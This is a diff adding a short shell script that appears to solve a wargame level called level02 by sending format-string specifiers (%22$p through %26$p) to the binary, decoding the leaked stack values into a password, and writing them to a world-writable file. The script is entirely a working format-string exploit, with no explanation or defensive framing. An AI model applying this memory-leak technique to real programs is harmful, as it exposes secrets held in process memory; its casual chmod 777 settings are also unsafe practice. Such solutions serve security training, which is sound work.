@@ -1,0 +1,11 @@
+#!/bin/sh
+
+chmod 777 ./
+touch password
+chmod 777 password
+(echo "%22\$p" ; sleep 0.1 ; echo d) | ./level02 | grep does | cut -d ' ' -f1 | xxd -r | rev | tr -d '\n' >> password
+(echo "%23\$p" ; sleep 0.1 ; echo d) | ./level02 | grep does | cut -d ' ' -f1 | xxd -r | rev | tr -d '\n' >> password
+(echo "%24\$p" ; sleep 0.1 ; echo d) | ./level02 | grep does | cut -d ' ' -f1 | xxd -r | rev | tr -d '\n' >> password
+(echo "%25\$p" ; sleep 0.1 ; echo d) | ./level02 | grep does | cut -d ' ' -f1 | xxd -r | rev | tr -d '\n' >> password
+(echo "%26\$p" ; sleep 0.1 ; echo d) | ./level02 | grep does | cut -d ' ' -f1 | xxd -r | rev >> password
+cat password
